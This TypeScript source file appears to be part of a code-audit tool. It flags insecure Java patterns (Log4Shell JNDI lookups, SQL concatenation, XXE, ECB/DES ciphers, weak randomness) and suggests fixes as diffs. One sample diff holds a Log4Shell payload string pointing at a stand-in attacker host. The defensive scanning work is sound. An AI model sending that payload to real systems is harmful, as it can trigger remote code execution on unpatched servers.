import crypto from 'crypto';
import { AuditIssue } from '../../src/types';

export function scanJava(filePath: string, lineText: string, lineNum: number): AuditIssue[] {
  const issues: AuditIssue[] = [];

  // 1. Log4J lookups JNDI Injection
  if (/\b\$\{jndi:/.test(lineText)) {
    issues.push({
      id: `java-sec-log4j-${crypto.randomUUID().substring(0, 8)}`,
      filePath,
      line: lineNum,
      category: 'security',
      severity: 'critical',
      title: 'Remote Code Execution: Log4j JNDI Lookup',
      description: 'Log4Shell (CVE-2021-44228) allows unauthenticated remote attackers to execute arbitrary code on servers running outdated log4j instances through custom JNDI directory lookups.',
      snippet: lineText.trim(),
      suggestion: 'Remove logging templates containing dynamic JNDI prefixes. Upgrade log4j library versions to safe releases (>= 2.17.1).',
      diff: `@@ -${lineNum},1 +${lineNum},1 @@\n- logger.error("\${jndi:ldap://attacker.com/a}");\n+ logger.error("Sanitized event ID: " + safeId);`,
    });
  }

  // 2. Unsafe dynamic SQL concatenation
  if (/\bexecuteQuery\s*\(\s*(?:\w+\s*\+\s*\w+|.*(?:\w+\.toString\(.*\)|String\.format\(.*%s.*))/.test(lineText) && (lineText.includes('SELECT') || lineText.includes('INSERT') || lineText.includes('UPDATE'))) {
    issues.push({
      id: `java-sec-sqli-${crypto.randomUUID().substring(0, 8)}`,
      filePath,
      line: lineNum,
      category: 'security',
      severity: 'critical',
      title: 'SQL Injection: Concatenated query statement',
      description: 'Using raw Java string concatenation to build SQL statements bypasses JDBC statement parsing, permitting database command hijack.',
      snippet: lineText.trim(),
      suggestion: 'Utilize JDBC PreparedStatement objects with dynamic input parameter placeholders (?) instead of raw concatenation.',
      diff: `@@ -${lineNum},1 +${lineNum},1 @@\n- Statement stmt = conn.createStatement();\n- ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE name = '" + name + "'");\n+ PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE name = ?");\n+ pstmt.setString(1, name);\n+ ResultSet rs = pstmt.executeQuery();`,
    });
  }

  // 3. XML External Entity (XXE) Injection
  if (/DocumentBuilderFactory\s+\w+\s*=\s*DocumentBuilderFactory\.newInstance\s*\(\s*\)/.test(lineText)) {
    issues.push({
      id: `java-sec-xxe-${crypto.randomUUID().substring(0, 8)}`,
      filePath,
      line: lineNum,
      category: 'security',
      severity: 'warning',
      title: 'XML External Entity (XXE) Vulnerability',
      description: 'DocumentBuilderFactory does not disable external entity processing (DTDs) by default. Dynamic external resource inclusions let attackers extract files from the host server.',
      snippet: lineText.trim(),
      suggestion: 'Secure the DocumentBuilderFactory parser explicitly by setting security features to disable external DTDs.',
      diff: `@@ -${lineNum},1 +${lineNum},1 @@\n- DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n+ DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n+ dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`,
    });
  }

  // 4. Insecure ECB Mode Cryptography
  if (/\bCipher\.getInstance\s*\(\s*["']AES\/ECB/i.test(lineText) || /\bCipher\.getInstance\s*\(\s*["']DES/i.test(lineText)) {
    issues.push({
      id: `java-sec-cipher-${crypto.randomUUID().substring(0, 8)}`,
      filePath,
      line: lineNum,
      category: 'security',
      severity: 'critical',
      title: 'Insecure Cipher: Weak block cipher mode (ECB)',
      description: 'ECB (Electronic Codebook) mode encrypts identical plaintext blocks into identical ciphertext blocks. This leaks structural patterns in the encrypted payloads.',
      snippet: lineText.trim(),
      suggestion: 'Utilize secure Galois/Counter Mode (AES/GCM/NoPadding) or Cipher Block Chaining (AES/CBC/PKCS5Padding) with randomized IV seeds.',
      diff: `@@ -${lineNum},1 +${lineNum},1 @@\n- Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");\n+ Cipher c = Cipher.getInstance("AES/GCM/NoPadding");`,
    });
  }

  // 5. Weak pseudorandom numbers
  if (/\bnew\s+Random\s*\(/.test(lineText) && !lineText.includes('SecureRandom')) {
    issues.push({
      id: `java-sec-rand-${crypto.randomUUID().substring(0, 8)}`,
      filePath,
      line: lineNum,
      category: 'security',
      severity: 'warning',
      title: 'Insecure Randomness: java.util.Random usage',
      description: 'The standard java.util.Random class utilizes a simple linear congruential generator which is cryptographically insecure and easily brute-forced.',
      snippet: lineText.trim(),
      suggestion: 'Use java.security.SecureRandom for generating session IDs, secret salts, or security-sensitive numeric tokens.',
      diff: `@@ -${lineNum},1 +${lineNum},1 @@\n- Random rand = new Random();\n+ java.security.SecureRandom rand = new java.security.SecureRandom();`,
    });
  }

  return issues;
}
